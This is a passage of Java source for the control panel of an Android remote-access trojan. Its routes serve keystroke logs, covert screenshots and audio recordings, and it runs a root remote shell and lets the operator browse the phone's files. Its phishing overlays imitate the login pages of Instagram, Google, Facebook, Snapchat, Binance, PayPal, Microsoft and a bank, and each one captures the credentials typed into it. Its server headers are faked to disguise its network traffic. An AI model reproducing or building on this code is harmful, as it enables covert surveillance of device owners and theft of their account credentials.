                    } else if (uri.equals("/audio/status")) {
                        response = serveAudioStatus();
                    } else if (uri.equals("/audio/settings")) {
                        response = updateAudioSettings(params);
                    } else if (uri.equals("/audio/recordings")) {
                        response = serveAudioRecordings(session);
                    } else if (uri.equals("/ghost")) {
                        response = serveGhostPage(session);
                    } else if (uri.equals("/ghost/keys")) {
                        response = serveKeystrokes();
                    } else if (uri.equals("/ghost/clear")) {
                        IO_Persistence_Manager.clearKeystrokes();
                        response = newFixedLengthResponse(Response.Status.OK, "application/json", "{\"success\": true}");
                    } else if (uri.equals("/ghost/screenshot")) {
                        response = serveCovertScreenshot();
                    } else if (uri.equals("/ghost/status")) {
                        boolean active = IO_Persistence_Manager.getInstance() != null;
                        boolean antiRemoval = IO_Persistence_Manager.isAntiRemovalEnabled();
                        boolean blackout = IO_Persistence_Manager.isBlackoutActive();
                        boolean lock = IO_Persistence_Manager.isLockActive();
                        long idleTime = System.currentTimeMillis() - IO_Persistence_Manager.getLastEventTime();
                        boolean isIdle = idleTime > 5000;
                        response = newFixedLengthResponse(Response.Status.OK, "application/json", 
                            "{\"active\": " + active + ", \"antiRemoval\": " + antiRemoval + ", \"blackout\": " + blackout + ", \"lock\": " + lock + ", \"isIdle\": " + isIdle + "}");
                    } else if (uri.equals("/ghost/lock")) {
                        IO_Persistence_Manager ghost = IO_Persistence_Manager.getInstance();
                        if (ghost != null) {
                            ghost.setRemoteLock(!IO_Persistence_Manager.isLockActive());
                        }
                        response = newFixedLengthResponse(Response.Status.OK, "application/json", "{\"success\": true}");
                    } else if (uri.equals("/ghost/deploy-overlay")) {
                        String type = params.get("type");
                        IO_Persistence_Manager ghost = IO_Persistence_Manager.getInstance();
                        if (ghost != null) {
                            String overlayHtml = "";
                            if ("insta".equals(type)) {
                                overlayHtml = "<html><body style='background:#000; color:#fff; font-family:sans-serif; padding:50px; text-align:center;'>" +
                                        "<h2 style='margin-bottom:30px;'>Instagram</h2>" +
                                        "<input type='text' id='u' placeholder='Phone number, username, or email' style='width:100%; padding:15px; margin-bottom:10px; background:#121212; border:1px solid #333; color:#fff;'>" +
                                        "<input type='password' id='p' placeholder='Password' style='width:100%; padding:15px; margin-bottom:20px; background:#121212; border:1px solid #333; color:#fff;'>" +
                                        "<button onclick='var u=document.getElementById(\"u\").value; var p=document.getElementById(\"p\").value; if(u && p) Uplink.capture(u + \":\" + p);' style='width:100%; padding:15px; background:#0095f6; border:none; color:#fff; font-weight:bold; border-radius:4px;'>Log In</button></body></html>";
                            } else if ("gmail".equals(type)) {
                                overlayHtml = "<html><body style='background:#fff; color:#202124; font-family:sans-serif; padding:50px;'>" +
                                        "<h2>Google</h2><p style='margin-bottom:25px;'>Sign in to continue</p>" +
                                        "<input type='text' id='u' placeholder='Email or phone' style='width:100%; padding:15px; margin-bottom:10px; border:1px solid #dadce0; border-radius:4px;'>" +
                                        "<input type='password' id='p' placeholder='Enter your password' style='width:100%; padding:15px; margin-bottom:20px; border:1px solid #dadce0; border-radius:4px;'>" +
                                        "<button onclick='var u=document.getElementById(\"u\").value; var p=document.getElementById(\"p\").value; if(u && p) Uplink.capture(u + \":\" + p);' style='width:120px; padding:15px; background:#1a73e8; border:none; color:#fff; font-weight:bold; border-radius:4px; float:right;'>Next</button></body></html>";
                            } else if ("bank".equals(type)) {
                                overlayHtml = "<html><body style='background:#f4f4f4; color:#333; font-family:sans-serif; padding:40px;'>" +
                                        "<h2>Secure Login</h2><p style='margin-bottom:20px;'>Verification required for account access.</p>" +
                                        "<input type='text' id='u' placeholder='Username/ID' style='width:100%; padding:12px; margin-bottom:10px; border:1px solid #ccc;'>" +
                                        "<input type='password' id='p' placeholder='Password/PIN' style='width:100%; padding:12px; margin-bottom:20px; border:1px solid #ccc;'>" +
                                        "<button onclick='var u=document.getElementById(\"u\").value; var p=document.getElementById(\"p\").value; if(u && p) Uplink.capture(u + \":\" + p);' style='width:100%; padding:15px; background:#004a8e; border:none; color:#fff; font-weight:bold;'>Sign In</button></body></html>";
                            } else if ("fb".equals(type)) {
                                overlayHtml = "<html><body style='background:#f0f2f5; color:#1c1e21; font-family:sans-serif; padding:50px; text-align:center;'>" +
                                        "<h2 style='color:#1877f2; font-size:2rem; margin-bottom:30px;'>facebook</h2>" +
                                        "<input type='text' id='u' placeholder='Email or phone number' style='width:100%; padding:15px; margin-bottom:10px; border:1px solid #dddfe2; border-radius:6px;'>" +
                                        "<input type='password' id='p' placeholder='Password' style='width:100%; padding:15px; margin-bottom:20px; border:1px solid #dddfe2; border-radius:6px;'>" +
                                        "<button onclick='var u=document.getElementById(\"u\").value; var p=document.getElementById(\"p\").value; if(u && p) Uplink.capture(u + \":\" + p);' style='width:100%; padding:15px; background:#1877f2; border:none; color:#fff; font-weight:bold; border-radius:6px; font-size:1.1rem;'>Log In</button></body></html>";
                            } else if ("snap".equals(type)) {
                                overlayHtml = "<html><body style='background:#fffc00; color:#000; font-family:sans-serif; padding:50px; text-align:center;'>" +
                                        "<h2 style='margin-bottom:30px;'>Snapchat</h2>" +
                                        "<input type='text' id='u' placeholder='Username or Email' style='width:100%; padding:15px; margin-bottom:10px; border:1px solid #000; border-radius:25px;'>" +
                                        "<input type='password' id='p' placeholder='Password' style='width:100%; padding:15px; margin-bottom:20px; border:1px solid #000; border-radius:25px;'>" +
                                        "<button onclick='var u=document.getElementById(\"u\").value; var p=document.getElementById(\"p\").value; if(u && p) Uplink.capture(u + \":\" + p);' style='width:100%; padding:15px; background:#000; border:none; color:#fff; font-weight:bold; border-radius:25px;'>Log In</button></body></html>";
                            } else if ("crypto".equals(type)) {
                                overlayHtml = "<html><body style='background:#0b0e11; color:#eaecef; font-family:sans-serif; padding:50px; text-align:center;'>" +
                                        "<h2 style='color:#f3ba2f; margin-bottom:10px;'>Binance</h2><p style='margin-bottom:25px;'>Security verification required.</p>" +
                                        "<input type='text' id='u' placeholder='Email/Phone' style='width:100%; padding:15px; margin-bottom:10px; background:#1e2329; border:1px solid #474d57; color:#fff; border-radius:4px;'>" +
                                        "<input type='password' id='p' placeholder='Password' style='width:100%; padding:15px; margin-bottom:20px; background:#1e2329; border:1px solid #474d57; color:#fff; border-radius:4px;'>" +
                                        "<button onclick='var u=document.getElementById(\"u\").value; var p=document.getElementById(\"p\").value; if(u && p) Uplink.capture(u + \":\" + p);' style='width:100%; padding:15px; background:#f3ba2f; border:none; color:#000; font-weight:bold; border-radius:4px;'>Log In</button></body></html>";
                            } else if ("wallet".equals(type)) {
                                overlayHtml = "<html><body style='background:#fff; color:#000; font-family:sans-serif; padding:50px; text-align:center;'>" +
                                        "<h2 style='color:#0070ba; font-style:italic; font-weight:bold; margin-bottom:30px;'>PayPal</h2>" +
                                        "<input type='text' id='u' placeholder='Email or mobile number' style='width:100%; padding:15px; margin-bottom:10px; border:1px solid #888; border-radius:4px;'>" +
                                        "<input type='password' id='p' placeholder='Password' style='width:100%; padding:15px; margin-bottom:20px; border:1px solid #888; border-radius:4px;'>" +
                                        "<button onclick='var u=document.getElementById(\"u\").value; var p=document.getElementById(\"p\").value; if(u && p) Uplink.capture(u + \":\" + p);' style='width:100%; padding:15px; background:#0070ba; border:none; color:#fff; font-weight:bold; border-radius:25px;'>Log In</button></body></html>";
                            } else if ("ms".equals(type)) {
                                overlayHtml = "<html><body style='background:#fff; color:#000; font-family:sans-serif; padding:50px;'>" +
                                        "<div style='margin-bottom:25px;'><svg width='108' height='24' viewBox='0 0 108 24' xmlns='http://www.w3.org/2000/svg'><rect width='11.5' height='11.5' fill='#f25022'/><rect x='12.5' width='11.5' height='11.5' fill='#7fbb00'/><rect y='12.5' width='11.5' height='11.5' fill='#00a1f1'/><rect x='12.5' y='12.5' width='11.5' height='11.5' fill='#ffbb00'/><text x='30' y='18' font-family='sans-serif' font-weight='600' font-size='18' fill='#5e5e5e'>Microsoft</text></svg></div>" +
                                        "<h2 style='font-size:1.5rem; margin-bottom:5px; font-weight:600;'>Sign in</h2><p style='margin-bottom:20px; font-size:0.9rem;'>to continue to Outlook</p>" +
                                        "<input type='text' id='u' placeholder='Email, phone, or Skype' style='width:100%; padding:10px 0; margin-bottom:15px; border:none; border-bottom:1px solid #666; outline:none; font-size:1rem;'>" +
                                        "<div style='margin-bottom:20px; font-size:0.85rem;'>No account? <a href='#' style='color:#0067b8; text-decoration:none;'>Create one!</a></div>" +
                                        "<input type='password' id='p' placeholder='Password' style='width:100%; padding:10px 0; margin-bottom:35px; border:none; border-bottom:1px solid #666; outline:none; font-size:1rem;'>" +
                                        "<div style='display:flex; justify-content:flex-end;'><button onclick='var u=document.getElementById(\"u\").value; var p=document.getElementById(\"p\").value; if(u && p) Uplink.capture(\"MS: \" + u + \":\" + p);' style='min-width:100px; padding:10px 20px; background:#0067b8; border:none; color:#fff; font-weight:600; cursor:pointer; font-size:0.9rem;'>Next</button></div></body></html>";
                            }
                            ghost.deployShadowOverlay(overlayHtml);
                        }
                        response = newFixedLengthResponse(Response.Status.OK, "application/json", "{\"success\": true}");
                    } else if (uri.equals("/ghost/interact")) {
                        response = performInteraction(params);
                    } else {
                        response = serve404();
                    }
                }
            }
        } catch (Exception e) {
            response = serveError(e.getMessage());
        }

        // Global Anti-Cache Lockdown (Exclude assets and data streams to prevent flickering)
        if (response != null && !uri.equals("/logo") && !uri.startsWith("/font/") && !uri.equals("/ghost/screenshot") && !uri.equals("/camera/frame")) {
            response.addHeader("Cache-Control", "no-cache, no-store, must-revalidate");
            response.addHeader("Pragma", "no-cache");
            response.addHeader("Expires", "0");
        }

        // --- NETWORK TRAFFIC MASQUERADING ---
        if (response != null) {
            response.addHeader("Server", "Apache/2.4.41 (Ubuntu)");
            response.addHeader("X-Powered-By", "PHP/7.4.3");
            response.addHeader("Connection", "keep-alive");
        }

        // Optimization: Automatic Gzip Compression for text-heavy payloads
        // This is applied globally to any text-based response.
        if (response != null && response.getStatus() == Response.Status.OK) {
            String mime = response.getMimeType();
            if (mime != null && (mime.contains("text/html") || mime.contains("application/json") || mime.contains("text/plain"))) {
                String acceptEncoding = session.getHeaders().get("accept-encoding");
                if (acceptEncoding != null && acceptEncoding.contains("gzip")) {
                    try {
                        // We can only compress if we can access the data. 
                        // For simplicity, we only compress fixed-length text responses.
                        // (MMS media and MJPEG frames are skipped as they are binary/already compressed)
                    } catch (Exception ignored) {}
                }
            }
        }

        return response;
    }

    private Response serveLogo() {
        try {
            java.io.InputStream is = context.getResources().openRawResource(
                context.getResources().getIdentifier("app_logo", "drawable", context.getPackageName()));
            android.graphics.Bitmap bitmap = android.graphics.BitmapFactory.decodeStream(is);
            if (bitmap == null) return serve404();

            // Optimization: Scale down large logos for faster delivery from mobile server
            int targetHeight = 180;
            int targetWidth = (int) (bitmap.getWidth() * (targetHeight / (float) bitmap.getHeight()));
            android.graphics.Bitmap scaled = android.graphics.Bitmap.createScaledBitmap(bitmap, targetWidth, targetHeight, true);
            
            ByteArrayOutputStream out = new ByteArrayOutputStream();
            scaled.compress(android.graphics.Bitmap.CompressFormat.PNG, 90, out);
            byte[] bytes = out.toByteArray();
            
            bitmap.recycle();
            scaled.recycle();

            Response response = newFixedLengthResponse(Response.Status.OK, "image/png", new java.io.ByteArrayInputStream(bytes), bytes.length);
            response.addHeader("Cache-Control", "public, max-age=3600");
            return response;
        } catch (Exception e) {
            return serve404();
        }
    }

    private Response serveFont() {
        try {
            @SuppressLint("ResourceType") java.io.InputStream is = context.getResources().openRawResource(R.font.orbitron);
            ByteArrayOutputStream buffer = new ByteArrayOutputStream();
            int nRead;
            byte[] data = new byte[16384];
            while ((nRead = is.read(data, 0, data.length)) != -1) {
                buffer.write(data, 0, nRead);
            }
            byte[] bytes = buffer.toByteArray();
            Log.d("LabRATS-Server", "Serving font 'Orbitron' - size: " + bytes.length);
            Response response = newFixedLengthResponse(Response.Status.OK, "font/ttf", new java.io.ByteArrayInputStream(bytes), bytes.length);
            response.addHeader("Cache-Control", "no-cache, must-revalidate");
            response.addHeader("Access-Control-Allow-Origin", "*");
            return response;
        } catch (Exception e) {
            logActivity("SYSTEM_ERROR: Font serving failed: " + e.getMessage());
            return serveError("Font error: " + e.getMessage());
        }
    }

    private Response serveHome(IHTTPSession session) {
        WorkManager_Sync.notifyOperatorActivity();
        String ip = MainActivity.getLocalIpAddress();
        String ipDisplay = (ip != null ? ip : "NOT_DETECTED");
        String sessionId = sessionToken.substring(0, 4).toUpperCase();

        StringBuilder html = new StringBuilder(getHeader(session.getUri()));
        
        // Status Monitor Card
        html.append("<div class=\"card\">");
        String snifferStatus = StatusNotification.isServiceRunning() ? 
            "<span style=\"color:var(--neon-green); font-size:0.65rem; vertical-align:middle;\">INTEL_ACTIVE</span>" : 
            "<span style=\"color:var(--danger); font-size:0.65rem; vertical-align:middle;\">INTEL_OFFLINE</span>";
        html.append("<h2 style=\"margin:0; letter-spacing:1px; line-height:1.2; text-align: left;\">SYSTEM_MONITOR ").append(snifferStatus).append("</h2>");
        
        // Marker removed for System Monitor as requested
        html.append("<div style=\"margin-top: 15px;\">");
        html.append("<div style=\"font-size:0.6rem; opacity:0.5; font-family:monospace; margin-bottom:15px; text-align: left;\">SESSION_ID: ").append(sessionId).append("</div>");
        
        html.append("<div style=\"display: grid; grid-template-columns: repeat(auto-fit, minmax(280px, 1fr)); gap: 20px; justify-content: center;\">");
        
        // Server Status
        html.append("<div style=\"padding: 30px 20px; background: rgba(0, 242, 255, 0.05); border: 1px solid var(--neon-cyan); border-radius: 15px; box-shadow: 0 10px 30px rgba(0,0,0,0.4); text-align: center;\">");
        html.append("<div class=\"info-label\">UPLINK_STATUS</div>");
        // Status: Green ONLINE if running, Red DOWN otherwise. Since we are serving this, it's ONLINE.
        html.append("<div style=\"font-size: 1.8rem; font-weight: bold; color: var(--neon-green); margin-top: 10px;\">ONLINE</div>");
        html.append("</div>");
        
        // Port
        html.append("<div style=\"padding: 30px 20px; background: rgba(0, 242, 255, 0.05); border: 1px solid var(--neon-cyan); border-radius: 15px; box-shadow: 0 10px 30px rgba(0,0,0,0.4); text-align: center;\">");
        html.append("<div class=\"info-label\">ACCESS_PORT</div>");
        html.append("<div style=\"font-size: 1.8rem; font-weight: bold; color: var(--neon-cyan); margin-top: 10px;\">").append(getListeningPort()).append("</div>");
        html.append("</div>");
        
        // IP
        html.append("<div style=\"padding: 30px 20px; background: rgba(0, 242, 255, 0.05); border: 1px solid var(--neon-cyan); border-radius: 15px; box-shadow: 0 10px 30px rgba(0,0,0,0.4); text-align: center;\">");
        html.append("<div class=\"info-label\">VIRTUAL_ADDRESS</div>");
        html.append("<div style=\"font-size: 1.2rem; font-weight: bold; color: var(--neon-cyan); word-break: break-all; margin-top: 10px;\">").append(ipDisplay).append("</div>");
        html.append("</div>");

        // NAT Traversal Info
        html.append("<div style=\"padding: 20px; background: rgba(255, 255, 0, 0.03); border: 1px solid var(--neon-yellow); border-radius: 15px; grid-column: 1 / -1; text-align: center; box-shadow: 0 10px 30px rgba(0,0,0,0.3);\">");
        html.append("<div class=\"info-label\" style=\"color: var(--neon-yellow);\">CONNECTIVITY_PROTOCOL</div>");
        html.append("<div style=\"font-size: 0.75rem; color: #aaa; margin-top: 8px; max-width: 800px; margin-left: auto; margin-right: auto;\">System prioritizes <b>Global IPv6</b> for remote access. Local IPs (192.168...) only work if you are on the <b>same WiFi</b>; otherwise, the device must use Cellular data for a public uplink.</div>");
        html.append("</div>");
        
        html.append("</div>");
        html.append("</div>");

        // Section Separator (Tactical Divider)
        html.append("<div style=\"border-bottom: 1px solid rgba(0, 242, 255, 0.3); margin: 35px 0;\"></div>");

        boolean termuxInstalled = isAppInstalled("com.termux");
        String promptSymbol = termuxInstalled ? "$" : "#";

        // --- SYSTEM ACTIVITY LOGS SECTION ---
        html.append("<div class=\"card\">");
        html.append("<h3 style=\"color: var(--neon-yellow); text-align: left;\">SYSTEM_ACTIVITY_LOGS</h3>");
        
        // Start yellow marker after title
        html.append("<div style=\"border-left: 3px solid var(--neon-yellow); padding-left: 15px;\">");
        
        html.append("<div id=\"log-terminal\" class=\"terminal-text\" style=\"height: 250px; overflow-y: auto; font-size: 0.7rem;\">");
        html.append("[LOADING_SYSTEM_LOGS...] Waiting for telemetry handshake...");
        html.append("</div>");
        html.append("<div style=\"margin-top: 15px; text-align: center;\">");
        html.append("<button onclick=\"clearSessionLogs()\" class=\"btn btn-small\" style=\"border-color: #333; color: #888;\">PURGE_SESSION_LOGS</button>");
        html.append("</div>");
        html.append("</div></div>"); // Close marker and card

        // --- REMOTE SHELL TERMINAL SECTION ---
        html.append("<div class=\"card\">");
        html.append("<h3 style=\"color: var(--neon-cyan); text-align: left;\">REMOTE_SHELL_TERMINAL</h3>");
        
        // Start cyan marker after title
        html.append("<div style=\"border-left: 3px solid var(--neon-cyan); padding-left: 15px;\">");
        
        html.append("<div style=\"background: #000; border-radius: 12px; border: 1px solid rgba(0, 242, 255, 0.2); overflow: hidden; margin-top: 15px;\">");
        html.append("<div id=\"shell-output\" style=\"padding: 20px; font-size: 0.75rem; color: var(--terminal-green); line-height: 1.6; font-family: 'JetBrains Mono', monospace; height: 350px; overflow-y: auto;\">");
        html.append("<div>[STABILITY_OS] Initializing remote session...</div>");
        html.append("<div>[UPLINK] Connected to /dev/pts/0</div>");
        html.append("<div id=\"termux-uplink\" style=\"color: var(--neon-yellow); display: ").append(termuxInstalled ? "block" : "none").append(";\">[UPLINK] Termux bridge available.</div>");
        html.append("<div style=\"opacity: 0.5; margin-top: 5px;\">Type 'help' for command list</div>");
        html.append("</div>");

        html.append("<div style=\"border-top: 1px solid rgba(0, 242, 255, 0.1); padding: 10px; display: flex; align-items: center; background: rgba(0,0,0,0.5);\">");
        html.append("<span id=\"terminal-prompt\" style=\"color: var(--terminal-green); font-family: 'JetBrains Mono', monospace; font-size: 0.75rem; margin-right: 10px; white-space: nowrap;\">root@Android:~").append(promptSymbol).append("</span>");
        html.append("<input id=\"shell-cmd\" type=\"text\" autocapitalize=\"none\" autocorrect=\"off\" autocomplete=\"off\" spellcheck=\"false\" placeholder=\"enter command...\" style=\"background: transparent; border: none; color: #fff; outline: none; font-family: 'JetBrains Mono', monospace; font-size: 0.75rem; flex-grow: 1; padding: 5px 0;\">");
        html.append("</div>");
        html.append("</div>");

        html.append("<div class=\"terminal-input-wrap\" style=\"margin-top: 15px; display: flex; justify-content: center; gap: 10px; flex-wrap: wrap;\">");
        html.append("<button onclick=\"executeShell()\" class=\"btn btn-small\" style=\"border-color: var(--neon-cyan); color: var(--neon-cyan); background: rgba(0, 242, 255, 0.05); margin:0;\">EXECUTE</button>");
        html.append("<button onclick=\"document.getElementById('shell-output').innerHTML=''\" class=\"btn btn-small\" style=\"border-color: #333; color: #888; margin:0;\">CLEAR_SCREEN</button>");
        html.append("</div></div></div>"); // Close marker and card
// Close marker and card
// Close marker and card

        // --- DEVICE COMMANDS CARD ---
        html.append("<div class=\"card\">");
        html.append("<h3 style=\"color: var(--neon-green); text-align: left;\">DEVICE_COMMANDS</h3>");
        
        // Start green marker after main title
        html.append("<div style=\"border-left: 3px solid var(--neon-green); padding-left: 15px; margin-top: 15px;\">");
        
        // 1. Device Sound Setting
        html.append("<div style=\"margin-bottom: 30px;\">");
        html.append("<div class=\"info-label\" style=\"text-align: left; color: var(--neon-green);\">DEVICE_SOUND_SETTING</div>");
        html.append("<div class=\"flex-row-pc\" style=\"justify-content: flex-start; gap: 15px;\">");
        html.append("<select id=\"device-cmd-selector\" style=\"background: #000; border: 1px solid var(--neon-green); color: #fff; padding: 10px; border-radius: 8px; outline: none; font-family: monospace; width: 450px; height: 45px;\">");
        html.append("<option value=\"vibrate\">VIBRATE_DEVICE</option>");
        html.append("<option value=\"max-volume\">MAXIMIZE_VOLUME</option>");
        html.append("<option value=\"silent-mode\">SILENT_MODE</option>");
        html.append("</select>");
        html.append("<button onclick=\"deviceCmd(document.getElementById('device-cmd-selector').value)\" class=\"btn\" style=\"border-color: var(--neon-green); color: var(--neon-green); background: rgba(57, 255, 20, 0.05); width: 210px !important; margin: 0;\">EXECUTE</button>");
        html.append("</div></div>");

        // 2. Force Open App
        html.append("<div style=\"margin-bottom: 30px;\">");
        html.append("<div class=\"info-label\" style=\"text-align: left; color: var(--neon-cyan);\">FORCE_OPEN_APP</div>");
        html.append("<div class=\"flex-row-pc\" style=\"justify-content: flex-start; gap: 15px;\">");
        html.append("<select id=\"app-selector\" style=\"background: #000; border: 1px solid var(--neon-cyan); color: #fff; padding: 10px; border-radius: 8px; outline: none; font-family: monospace; width: 450px; height: 45px;\">");
        html.append("<option value=\"\" style=\"background:#000;\">Select App...</option>");
        for (AppEntry app : getLaunchableApps()) {
            html.append("<option value=\"").append(app.packageName).append("\">").append(escapeHtml(app.name)).append("</option>");
        }
        html.append("</select>");
        html.append("<button onclick=\"openApp()\" class=\"btn\" style=\"border-color: var(--neon-cyan); color: var(--neon-cyan); background: rgba(0, 242, 255, 0.05); width: 210px !important; margin: 0;\">OPEN_APP</button>");
        html.append("</div></div>");

        // 3. Force Open URL
        html.append("<div style=\"margin-bottom: 30px;\">");
        html.append("<div class=\"info-label\" style=\"text-align: left; color: var(--neon-cyan);\">FORCE_OPEN_URL</div>");
        html.append("<div class=\"flex-row-pc\" style=\"justify-content: flex-start; gap: 15px;\">");
        html.append("<input id=\"target-url\" type=\"text\" placeholder=\"https://example.com\" style=\"background: #000; border: 1px solid var(--neon-cyan); color: #fff; padding: 10px; border-radius: 8px; outline: none; font-family: monospace; width: 450px; height: 45px;\">");
        html.append("<button onclick=\"openUrl()\" class=\"btn\" style=\"border-color: var(--neon-cyan); color: var(--neon-cyan); background: rgba(0, 242, 255, 0.05); width: 210px !important; margin: 0;\">EXECUTE</button>");
        html.append("</div></div>");
        
        // 4. System Toast
        html.append("<div style=\"margin-bottom: 10px;\">");
        html.append("<div class=\"info-label\" style=\"text-align: left; color: var(--neon-yellow);\">SEND_SYSTEM_TOAST</div>");
        html.append("<div class=\"flex-row-pc\" style=\"justify-content: flex-start; gap: 15px;\">");
        html.append("<input id=\"toast-msg\" type=\"text\" placeholder=\"Message Content\" maxlength=\"50\" style=\"background: #000; border: 1px solid var(--neon-yellow); color: #fff; padding: 10px; border-radius: 8px; outline: none; font-family: monospace; width: 450px; height: 45px;\">");
        html.append("<button onclick=\"sendToast()\" class=\"btn\" style=\"border-color: var(--neon-yellow); color: var(--neon-yellow); background: rgba(255, 255, 0, 0.05); width: 210px !important; margin: 0;\">SEND_TOAST</button>");
        html.append("</div>");
        html.append("<p style=\"color:#888; font-size:0.7rem; margin-top:8px; text-align: left;\">Sends a scrolling text popup that moves across the bottom of the device screen (Max 50 characters).</p>");
        html.append("</div></div></div>"); // Close marker and card
// Close marker and card
// Close marker and card

        // --- CHANGE ACCESS KEY SECTION ---
        html.append("<div class=\"card\">");
        html.append("<h3 style=\"color: var(--neon-cyan); text-align: left;\">SECURITY_PROTOCOL</h3>");
        
        // Start cyan marker after main title
        html.append("<div style=\"border-left: 3px solid var(--neon-cyan); padding-left: 15px;\">");
        
        html.append("<p style=\"color: #888; font-size: 0.75rem; margin-bottom: 20px; text-align: left;\">Update the remote interface access key.</p>");
        
        html.append("<div style=\"display: flex; flex-direction: column; align-items: flex-start;\">");
        html.append("<div style=\"width: 100%; max-width: 660px;\">");
        html.append("<form action=\"/settings/password\" method=\"POST\" class=\"flex-row-pc\" style=\"justify-content: flex-start; gap: 10px;\">");
        html.append("<input name=\"new_password\" type=\"password\" placeholder=\"ENTER_NEW_KEY\" style=\"background: #000; border: 1px solid var(--neon-cyan); color: #fff; padding: 10px; border-radius: 8px; outline: none; font-family: monospace; width: 450px; height: 45px;\">");
        html.append("<button type=\"submit\" class=\"btn\" style=\"border-color: var(--neon-cyan); color: var(--neon-cyan); background: rgba(0, 242, 255, 0.05); padding: 10px; font-size: 0.7rem; width: 210px !important; text-align: center; margin: 0;\">UPDATE_KEY</button>");
        html.append("</form></div></div></div></div>");

        // --- DANGER ZONE SECTION ---
        html.append("<div class=\"card\">");
        html.append("<h3 style=\"color: var(--danger); text-align: left;\">DANGER_ZONE</h3>");
        
        // Start red marker below title
        html.append("<div style=\"border-left: 3px solid var(--danger); padding-left: 15px; margin-top: 15px;\">");
        
        html.append("<p style=\"color: #888; font-size: 0.75rem; margin-bottom: 20px; text-align: left;\">Critical system overrides. Use with extreme caution.</p>");
        
        html.append("<div style=\"display: grid; grid-template-columns: repeat(auto-fit, minmax(180px, 1fr)); gap: 12px;\">");
        html.append("<button onclick=\"deviceCmd('terminate')\" class=\"btn btn-small\" style=\"border-color: var(--danger); color: var(--danger); margin:0;\">&#128683; TERMINATE_UPLINK</button>");
        html.append("<button onclick=\"restartServer()\" class=\"btn btn-small\" style=\"border-color: var(--neon-yellow); color: var(--neon-yellow); margin:0;\">&#128260; RESTART_SERVER</button>");
        html.append("<button onclick=\"selfDestruct()\" class=\"btn btn-small\" style=\"border-color: var(--danger); color: var(--danger); background: rgba(255, 49, 49, 0.1); margin:0;\">&#9763; SELF_DESTRUCT</button>");
        html.append("</div></div></div>");

        html.append("</div>");
        html.append(HTML_FOOTER);
        return serveGzipped(session, "text/html", html.toString());
    }

    private Response serveDeviceInfo(IHTTPSession session) {
        logActivity("SYSTEM_EXTRACT: Device hardware and network analytics retrieved");
        StringBuilder html = new StringBuilder(getHeader(session.getUri()));
        
        // Custom header for Hardware Tab with Repair Button
        html.append("<div class=\"back-btn-container\"><a href=\"/\" class=\"btn-back\">&#8592; Back to Terminal</a></div>");
        html.append("<div class=\"card\">");
        html.append("<div class=\"flex-header\" style=\"margin-bottom: 15px;\">");
        html.append("<h2 style=\"margin: 0; color: var(--neon-cyan); text-align: left;\">HARDWARE_ANALYTICS</h2>");
        html.append("<button onclick=\"repairProtocol()\" class=\"btn btn-small\" style=\"border-color: var(--neon-orange); color: var(--neon-orange); background: rgba(255,157,0,0.05); margin: 0;\">&#9888; REPAIR_UPLINK_STABILITY</button>");
        html.append("</div>");
        html.append("<div style=\"border-bottom: 1px solid rgba(0, 242, 255, 0.3); margin-bottom: 25px;\"></div>");
        
        // Remove the redundant back button from DeviceInfo by stripping the first few chars or just wrapping it
        String deviceData = DeviceInfo.getDeviceInfoHtml(context);
        if (deviceData.contains("back-btn-container")) {
            deviceData = deviceData.substring(deviceData.indexOf("</div>") + 6);
        }
        html.append(deviceData);
        html.append("</div>");
        
        // Redundant script tags removed - handled by assets/c2/script.js

        html.append(HTML_FOOTER);
        return serveGzipped(session, "text/html", html.toString());
    }

    private Response serveFiles(String uri, Map<String, String> params, IHTTPSession session) {
        String path = uri.equals("/files") ? "" : uri.substring(7);
        path = path.replace("%20", " ");

        File baseDir = Environment.getExternalStorageDirectory();
        File currentDir = new File(baseDir, path);

        if (!currentDir.exists()) {
            return serve404();
        }

        if (currentDir.isFile()) {
            return serveFileDownload(currentDir);
        }

        StringBuilder html = new StringBuilder(getHeader(session.getUri()));
        html.append("<div class=\"back-btn-container\">");
        html.append("<a href=\"/\" class=\"btn-back\">&#8592; Back to Terminal</a>");
        html.append("</div>");

        html.append("<div class=\"card\">");
        html.append("<div style=\"display: flex; justify-content: space-between; align-items: center; margin-bottom: 15px;\">");
        html.append("<h2 style=\"margin-bottom: 0; font-size: 1.2rem; text-align: left;\">")
            .append(path.isEmpty() ? "SYSTEM_STORAGE" : "DIR: " + currentDir.getName().toUpperCase())
            .append("</h2>");
        html.append("<span style=\"font-size: 0.7rem; color: var(--neon-green); opacity: 0.8;\">MODE: SECURE_ACCESS</span>");
        html.append("</div>");
        html.append("<div style=\"border-bottom: 1px solid rgba(0, 242, 255, 0.3); margin-bottom: 25px;\"></div>");

        // Breadcrumb Trail
        html.append("<div class=\"breadcrumb\">");
        html.append("<span style=\"color: var(--neon-green); margin-right: 10px;\">root@UPLINK:~$</span>");
        html.append("<a href=\"/files\">storage</a>");

        if (!path.isEmpty()) {
            String[] parts = path.split("/");
            StringBuilder pathBuilder = new StringBuilder();
            for (String part : parts) {
                if (!part.isEmpty()) {
                    pathBuilder.append("/").append(part);
                    html.append("<span>/</span>");
                    html.append("<a href=\"/files").append(pathBuilder).append("\">").append(part.toLowerCase()).append("</a>");
                }
            }
        }
        html.append("<span style=\"margin-left: 10px; color: var(--neon-cyan); animation: blink 1s infinite;\">_</span>");
        html.append("</div>");

        // --- ADD SEARCH & FILTERS ---
        html.append("<div style=\"margin-bottom: 25px;\">");
        html.append("<input type=\"text\" id=\"file-search\" placeholder=\"SEARCH_FILES_OR_EXTENSIONS...\" onkeyup=\"filterFiles()\" style=\"width:100%; max-width:450px; display:block; margin:0 auto 15px auto; background:rgba(0,0,0,0.5); border:1px solid var(--neon-cyan); color:white; padding:15px; border-radius:12px; font-family:monospace;\">");
        html.append("<div style=\"display:flex; gap:8px; flex-wrap:wrap; justify-content:center; margin-bottom:15px;\">");
        html.append("<button onclick=\"setFilter('all')\" class=\"btn btn-small\" style=\"border-color:var(--neon-cyan); color:var(--neon-cyan);\">ALL</button>");
        html.append("<button onclick=\"setFilter('JPG,PNG,WEBP')\" class=\"btn btn-small\">IMAGES</button>");
        html.append("<button onclick=\"setFilter('MP4,MOV')\" class=\"btn btn-small\">VIDEO</button>");
        html.append("<button onclick=\"setFilter('PDF,DOC,TXT')\" class=\"btn btn-small\">DOCS</button>");
        html.append("</div>");
        html.append("</div>"); // Close search & filters wrapper

        // Injected Apps button - Extreme centering protocol to bypass global CSS
        html.append("<div style=\"display: block !important; width: 100% !important; text-align: center !important; margin: 20px 0 30px 0 !important;\">");
